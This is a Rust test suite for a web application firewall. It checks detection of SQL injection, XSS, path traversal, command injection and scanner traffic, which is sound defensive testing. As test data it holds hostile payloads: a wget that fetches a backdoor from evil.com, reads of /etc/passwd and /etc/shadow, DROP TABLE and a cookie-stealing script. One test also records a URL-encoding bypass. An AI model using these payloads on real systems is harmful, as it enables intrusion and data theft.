use aegis_node::waf::{AegisWaf, WafAction, WafConfig, Severity, OversizedBodyAction, DEFAULT_MAX_INSPECTION_SIZE};
use hyper::{Body, Client, Request, StatusCode};
use std::net::SocketAddr;
use tokio::time::{sleep, Duration};

/// Helper to start a test HTTP server that echoes requests
async fn start_test_origin_server() -> SocketAddr {
    use hyper::service::{make_service_fn, service_fn};
    use hyper::{Response, Server};

    let make_svc = make_service_fn(|_conn| async {
        Ok::<_, hyper::Error>(service_fn(|req: Request<Body>| async move {
            // Echo back the URI that was requested
            let uri = req.uri().to_string();
            Ok::<_, hyper::Error>(Response::new(Body::from(format!("Echo: {}", uri))))
        }))
    });

    let addr = SocketAddr::from(([127, 0, 0, 1], 0));
    let server = Server::bind(&addr).serve(make_svc);
    let addr = server.local_addr();

    tokio::spawn(async move {
        server.await.ok();
    });

    sleep(Duration::from_millis(100)).await;
    addr
}

#[tokio::test]
async fn test_waf_blocks_sql_injection() {
    // Start origin server
    let origin_addr = start_test_origin_server().await;

    // Create WAF-enabled proxy
    let waf_config = WafConfig {
        enabled: true,
        min_severity: Severity::Warning,
        default_action: WafAction::Block,
        category_actions: std::collections::HashMap::new(),
        max_inspection_size: DEFAULT_MAX_INSPECTION_SIZE,
        oversized_body_action: OversizedBodyAction::Skip,
    };

    let waf = AegisWaf::new(waf_config);

    // Test SQL injection payloads
    let sql_attacks = vec![
        "/api/users?id=1' OR '1'='1",
        "/search?q=UNION SELECT password FROM users",
        "/login?user=admin'--",
        "/api/data?filter=1; DROP TABLE users",
    ];

    for attack_uri in sql_attacks {
        // Analyze with WAF
        let matches = waf.analyze_request("GET", attack_uri, &[], None);

        assert!(!matches.is_empty(), "WAF failed to detect SQL injection: {}", attack_uri);

        let action = waf.determine_action(&matches);
        assert_eq!(action, WafAction::Block, "WAF should block SQL injection: {}", attack_uri);

        // Verify it's a SQLi detection
        assert!(
            matches.iter().any(|m| m.category == "sqli"),
            "Should be categorized as SQLi: {}",
            attack_uri
        );
    }
}

#[tokio::test]
async fn test_waf_blocks_xss_attacks() {
    let waf = AegisWaf::new(WafConfig::default());

    let xss_attacks = vec![
        "/comment?text=<script>alert('XSS')</script>",
        "/profile?bio=<img src=x onerror=alert(1)>",
        "/redirect?url=javascript:alert(document.cookie)",
        "/page?content=<iframe src='http://evil.com'>",
    ];

    for attack_uri in xss_attacks {
        let matches = waf.analyze_request("GET", attack_uri, &[], None);

        assert!(!matches.is_empty(), "WAF failed to detect XSS: {}", attack_uri);
        assert_eq!(waf.determine_action(&matches), WafAction::Block);
        assert!(matches.iter().any(|m| m.category == "xss"));
    }
}

#[tokio::test]
async fn test_waf_blocks_path_traversal() {
    let waf = AegisWaf::new(WafConfig::default());

    let traversal_attacks = vec![
        "/download?file=../../../etc/passwd",
        "/api/file?path=..\\..\\windows\\system32\\config\\sam",
        "/read?file=/etc/shadow",
    ];

    for attack_uri in traversal_attacks {
        let matches = waf.analyze_request("GET", attack_uri, &[], None);

        assert!(!matches.is_empty(), "WAF failed to detect path traversal: {}", attack_uri);
        assert_eq!(waf.determine_action(&matches), WafAction::Block);
        assert!(matches.iter().any(|m| m.category == "path-traversal"));
    }
}

#[tokio::test]
async fn test_waf_blocks_command_injection() {
    let waf = AegisWaf::new(WafConfig::default());

    let rce_attacks = vec![
        "/exec?cmd=; ls -la",
        "/run?command=| cat /tmp/passwords",
        "/shell?input=$(wget http://evil.com/backdoor.sh)",
        "/admin?action=cmd.exe /c dir",
    ];

    for attack_uri in rce_attacks {
        let matches = waf.analyze_request("GET", attack_uri, &[], None);

        assert!(!matches.is_empty(), "WAF failed to detect RCE: {}", attack_uri);
        assert_eq!(waf.determine_action(&matches), WafAction::Block);
        assert!(matches.iter().any(|m| m.category == "rce"));
    }
}

#[tokio::test]
async fn test_waf_allows_clean_requests() {
    let waf = AegisWaf::new(WafConfig::default());

    let clean_requests = vec![
        "/",
        "/api/users",
        "/api/users/123",
        "/blog/2025/sprint-8-complete",
        "/static/css/style.css",
        "/api/search?q=rust+programming",
        "/profile?user=john_doe&page=2",
    ];

    for clean_uri in clean_requests {
        let matches = waf.analyze_request("GET", clean_uri, &[], None);

        assert!(
            matches.is_empty(),
            "False positive! WAF blocked clean request: {}",
            clean_uri
        );

        let action = waf.determine_action(&matches);
        assert_eq!(action, WafAction::Allow);
    }
}

#[tokio::test]
async fn test_waf_detects_scanner_user_agents() {
    let waf = AegisWaf::new(WafConfig::default());

    let scanner_headers = vec![
        ("User-Agent".to_string(), "Nikto/2.1.6".to_string()),
        ("User-Agent".to_string(), "sqlmap/1.0".to_string()),
        ("User-Agent".to_string(), "Nmap Scripting Engine".to_string()),
    ];

    for headers in scanner_headers.iter().map(|h| vec![h.clone()]) {
        let matches = waf.analyze_request("GET", "/", &headers, None);

        assert!(!matches.is_empty(), "Failed to detect scanner");
        assert_eq!(matches[0].category, "scanner");
        assert!(matches[0].location.starts_with("Header:"));
    }
}

#[tokio::test]
async fn test_waf_logging_mode() {
    // Create WAF in logging mode
    let waf_config = WafConfig {
        enabled: true,
        min_severity: Severity::Warning,
        default_action: WafAction::Log,  // Log instead of block
        category_actions: std::collections::HashMap::new(),
        max_inspection_size: DEFAULT_MAX_INSPECTION_SIZE,
        oversized_body_action: OversizedBodyAction::Skip,
    };

    let waf = AegisWaf::new(waf_config);

    // Send attack
    let attack_uri = "/api?id=1' OR '1'='1";
    let matches = waf.analyze_request("GET", attack_uri, &[], None);

    assert!(!matches.is_empty(), "Attack should be detected");

    // But action should be Log, not Block
    let action = waf.determine_action(&matches);
    assert_eq!(action, WafAction::Log, "Should log, not block");
}

#[tokio::test]
async fn test_waf_disabled_mode() {
    // Create disabled WAF
    let waf_config = WafConfig {
        enabled: false,
        min_severity: Severity::Warning,
        default_action: WafAction::Block,
        category_actions: std::collections::HashMap::new(),
        max_inspection_size: DEFAULT_MAX_INSPECTION_SIZE,
        oversized_body_action: OversizedBodyAction::Skip,
    };

    let waf = AegisWaf::new(waf_config);

    // Even obvious attacks should pass through
    let attack_uri = "/api?id=1' OR '1'='1";
    let matches = waf.analyze_request("GET", attack_uri, &[], None);

    assert!(matches.is_empty(), "Disabled WAF should not detect anything");
    assert_eq!(waf.determine_action(&matches), WafAction::Allow);
}

#[tokio::test]
async fn test_waf_category_specific_actions() {
    use std::collections::HashMap;

    // Create WAF with category-specific actions
    let mut category_actions = HashMap::new();
    category_actions.insert("scanner".to_string(), WafAction::Log);  // Log scanners
    category_actions.insert("sqli".to_string(), WafAction::Block);   // Block SQLi

    let waf_config = WafConfig {
        enabled: true,
        min_severity: Severity::Info,  // Catch everything
        default_action: WafAction::Block,
        category_actions,
        max_inspection_size: DEFAULT_MAX_INSPECTION_SIZE,
        oversized_body_action: OversizedBodyAction::Skip,
    };

    let waf = AegisWaf::new(waf_config);

    // Scanner should be logged only
    let scanner_headers = vec![("User-Agent".to_string(), "nikto scanner".to_string())];
    let matches = waf.analyze_request("GET", "/", &scanner_headers, None);
    assert_eq!(waf.determine_action(&matches), WafAction::Log);

    // SQLi should be blocked
    let sqli_matches = waf.analyze_request("GET", "/api?id=1' OR '1'='1", &[], None);
    assert_eq!(waf.determine_action(&sqli_matches), WafAction::Block);
}

#[tokio::test]
async fn test_waf_severity_thresholds() {
    // High severity threshold - only critical attacks blocked
    let waf_config = WafConfig {
        enabled: true,
        min_severity: Severity::Critical,
        default_action: WafAction::Block,
        category_actions: std::collections::HashMap::new(),
        max_inspection_size: DEFAULT_MAX_INSPECTION_SIZE,
        oversized_body_action: OversizedBodyAction::Skip,
    };

    let waf = AegisWaf::new(waf_config);

    // Critical attack should trigger
    let critical_attack = "/api?id=UNION SELECT password FROM users";
    let matches = waf.analyze_request("GET", critical_attack, &[], None);
    assert!(!matches.is_empty());
    assert!(matches[0].severity >= Severity::Critical);

    // Lower severity might not trigger action
    let action = waf.determine_action(&matches);
    assert_eq!(action, WafAction::Block);
}

#[tokio::test]
async fn test_waf_multiple_violations_in_one_request() {
    let waf = AegisWaf::new(WafConfig::default());

    // Request with BOTH SQLi AND XSS
    let multi_attack = "/search?q=<script>alert(1)</script>' OR '1'='1";
    let matches = waf.analyze_request("GET", multi_attack, &[], None);

    // Should detect multiple violations
    assert!(matches.len() >= 2, "Should detect both XSS and SQLi");

    // Should have both categories
    let categories: Vec<&str> = matches.iter().map(|m| m.category.as_str()).collect();
    assert!(categories.contains(&"xss") || categories.contains(&"sqli"));
}

#[tokio::test]
async fn test_waf_body_analysis() {
    let waf = AegisWaf::new(WafConfig::default());

    // Attack in POST body
    let malicious_body = b"username=admin&password=' OR '1'='1'--";

    let matches = waf.analyze_request(
        "POST",
        "/login",
        &[("Content-Type".to_string(), "application/x-www-form-urlencoded".to_string())],
        Some(malicious_body),
    );

    assert!(!matches.is_empty(), "Should detect SQLi in POST body");
    assert_eq!(matches[0].location, "Body");
    assert_eq!(waf.determine_action(&matches), WafAction::Block);
}

#[tokio::test]
async fn test_waf_header_injection() {
    let waf = AegisWaf::new(WafConfig::default());

    // Malicious headers
    let headers = vec![
        ("X-Custom-Header".to_string(), "<script>alert(1)</script>".to_string()),
        ("Referer".to_string(), "http://evil.com/../../etc/passwd".to_string()),
    ];

    let matches = waf.analyze_request("GET", "/api/data", &headers, None);

    assert!(!matches.is_empty(), "Should detect attacks in headers");
    assert!(matches.iter().any(|m| m.location.starts_with("Header:")));
}

#[tokio::test]
async fn test_waf_case_insensitive_detection() {
    let waf = AegisWaf::new(WafConfig::default());

    // Try to evade with case variations
    let evasion_attempts = vec![
        "/api?id=UNION SELECT * FROM users",  // Uppercase
        "/api?id=union select * from users",  // Lowercase
        "/api?id=UnIoN SeLeCt * FrOm users",  // Mixed case
    ];

    for attack in evasion_attempts {
        let matches = waf.analyze_request("GET", attack, &[], None);
        assert!(!matches.is_empty(), "Case variation should not evade WAF: {}", attack);
    }
}

#[tokio::test]
async fn test_waf_performance_under_load() {
    let waf = AegisWaf::new(WafConfig::default());

    // Measure time for 1000 requests
    let start = std::time::Instant::now();

    for i in 0..1000 {
        let uri = format!("/api/users/{}", i);
        let _matches = waf.analyze_request("GET", &uri, &[], None);
    }

    let elapsed = start.elapsed();
    let avg_per_request = elapsed.as_micros() / 1000;

    println!("WAF Performance: {}μs per request", avg_per_request);

    // Should be under 500μs per request on average
    assert!(
        avg_per_request < 500,
        "WAF too slow: {}μs per request (target: <500μs)",
        avg_per_request
    );
}

#[tokio::test]
async fn test_waf_custom_rules() {
    use aegis_node::waf::WafRule;
    use regex::Regex;

    let mut waf = AegisWaf::new(WafConfig::default());

    // Add custom rule for detecting API key in URL (bad practice)
    let custom_rule = WafRule {
        id: 999999,
        description: "API key in URL parameter".to_string(),
        pattern: Regex::new(r"(?i)[?&]api_key=").unwrap(),
        severity: Severity::Warning,
        category: "security-misconfiguration".to_string(),
    };

    waf.add_rule(custom_rule);

    // Test custom rule
    let bad_request = "/api/data?api_key=secret123";
    let matches = waf.analyze_request("GET", bad_request, &[], None);

    assert!(!matches.is_empty(), "Custom rule should detect API key in URL");
    assert!(matches.iter().any(|m| m.rule_id == 999999));
}

#[tokio::test]
async fn test_waf_rule_metadata() {
    let waf = AegisWaf::new(WafConfig::default());

    // Verify rule count
    assert_eq!(waf.get_rule_count(), 13, "Should have 13 default rules");

    // Verify rules by category
    let sqli_rules = waf.get_rules_by_category("sqli");
    assert_eq!(sqli_rules.len(), 3, "Should have 3 SQLi rules");

    let xss_rules = waf.get_rules_by_category("xss");
    assert_eq!(xss_rules.len(), 4, "Should have 4 XSS rules");

    let rce_rules = waf.get_rules_by_category("rce");
    assert_eq!(rce_rules.len(), 2, "Should have 2 RCE rules");
}

#[tokio::test]
async fn test_waf_match_details() {
    let waf = AegisWaf::new(WafConfig::default());

    let attack = "/search?q=<script>alert(1)</script>";
    let matches = waf.analyze_request("GET", attack, &[], None);

    assert!(!matches.is_empty());

    let first_match = &matches[0];

    // Verify match details
    assert!(first_match.rule_id > 0);
    assert!(!first_match.rule_description.is_empty());
    assert_eq!(first_match.location, "URI");
    assert!(!first_match.matched_value.is_empty());
    assert!(first_match.severity >= Severity::Warning);
}

#[tokio::test]
async fn test_waf_dangerous_http_methods() {
    let waf = AegisWaf::new(WafConfig::default());

    let dangerous_methods = vec!["TRACE", "TRACK", "DEBUG"];

    for method in dangerous_methods {
        let matches = waf.analyze_request(method, "/", &[], None);

        // Note: Current implementation only checks URI/headers/body, not method directly
        // This test documents future enhancement opportunity
        // For now, we'd need to add method to analyze_request or check separately
    }
}

#[tokio::test]
async fn test_waf_unicode_normalization_bypass_attempt() {
    let waf = AegisWaf::new(WafConfig::default());

    // Try to bypass with URL encoding
    let encoded_attack = "/api?id=%27%20OR%20%271%27=%271";  // ' OR '1'='1 encoded

    // Note: This would pass through current WAF since we don't decode
    // Future enhancement: Add URL decoding before analysis
    let matches = waf.analyze_request("GET", encoded_attack, &[], None);

    // Document the limitation
    if matches.is_empty() {
        println!("NOTE: URL-encoded attacks currently bypass WAF");
        println!("Enhancement needed: URL decode before pattern matching");
    }
}

#[tokio::test]
async fn test_waf_empty_request() {
    let waf = AegisWaf::new(WafConfig::default());

    let matches = waf.analyze_request("GET", "/", &[], None);
    assert!(matches.is_empty());
    assert_eq!(waf.determine_action(&matches), WafAction::Allow);
}

#[tokio::test]
async fn test_waf_very_long_uri() {
    let waf = AegisWaf::new(WafConfig::default());

    // Create a very long URI (potential DoS vector)
    let long_uri = format!("/api?param={}", "A".repeat(10000));

    let start = std::time::Instant::now();
    let _matches = waf.analyze_request("GET", &long_uri, &[], None);
    let elapsed = start.elapsed();

    // Should still process quickly (no catastrophic backtracking in regexes)
    assert!(
        elapsed.as_millis() < 10,
        "WAF regex should not have catastrophic backtracking"
    );
}
